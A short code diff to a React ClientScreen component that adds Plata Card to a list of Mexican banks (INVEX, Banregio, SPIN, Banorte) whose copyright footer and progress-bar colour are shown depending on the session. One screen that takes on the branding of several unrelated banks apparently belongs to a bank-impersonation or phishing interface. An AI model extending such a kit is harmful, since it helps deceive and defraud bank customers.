@@ -595,6 +595,7 @@ export default function ClientScreen() {
               sessionData.banco === 'INVEX' ? 'INVEX' :
               sessionData.banco === 'BANREGIO' ? 'Banregio' :
               sessionData.banco === 'SPIN' ? 'SPIN by Oxxo' :
+              sessionData.banco === 'PLATACARD' ? 'Plata Card' :
               'Banorte'
             } México 2024. Todos los Derechos Reservados</div>
           </div>
@@ -727,6 +728,7 @@ export default function ClientScreen() {
                 sessionData.banco === 'INVEX' ? 'invex-bg' :
                 sessionData.banco === 'BANREGIO' ? 'banregio-bg' :
                 sessionData.banco === 'SPIN' ? 'bg-[#6551FF]' :
+                sessionData.banco === 'PLATACARD' ? 'bg-[#FF5722]' :
                 'bg-[#EC1C24]'
               } animate-progress-bar`}></div>
             </div>
